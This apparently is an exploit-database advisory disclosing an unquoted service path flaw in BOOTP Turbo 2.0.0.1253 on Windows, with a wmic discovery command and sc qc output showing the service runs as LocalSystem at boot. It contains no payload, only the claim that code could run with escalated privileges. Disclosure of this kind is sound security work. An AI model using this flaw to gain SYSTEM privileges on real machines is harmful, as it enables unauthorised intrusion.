EXP
---

    # Exploit Title: BOOTP Turbo 2.0.0.1253 - 'bootpt.exe' Unquoted Service Path
    # Discovery by: Erick Galindo
    # Discovery Date: 2020-05-07
    # Vendor Homepage: https://www.weird-solutions.com
    # Software :  https://www.weird-solutions.com/download/products/bootpt_demo_x64.exe
    # Tested Version: 2.0.0.1253
    # Vulnerability Type: Unquoted Service Path
    # Tested on OS: Windows 10 Pro  x64 es
    # Step to discover Unquoted Service Path:

    C:\> wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr  /i "BOOTP"
    BOOTP Turbo           BOOTP Turbo           C:\Program Files\BOOTP Turbo\bootpt.exe                    Auto

    # Service info

    C:\>sc qc "BOOTP Turbo"
    [SC] QueryServiceConfig CORRECTO

    NOMBRE_SERVICIO: BOOTP Turbo
            TIPO               : 10  WIN32_OWN_PROCESS
            TIPO_INICIO        : 2   AUTO_START
            CONTROL_ERROR      : 1   NORMAL
            NOMBRE_RUTA_BINARIO: C:\Program Files\BOOTP Turbo\bootpt.exe
            GRUPO_ORDEN_CARGA  :
            ETIQUETA           : 0
            NOMBRE_MOSTRAR     : BOOTP Turbo
            DEPENDENCIAS       : Nsi
                               : Afd
                               : NetBT
                               : Tcpip
            NOMBRE_INICIO_SERVICIO: LocalSystem

    #Exploit:

    This vulnerability could permit executing code during startup or reboot with the escalated privileges.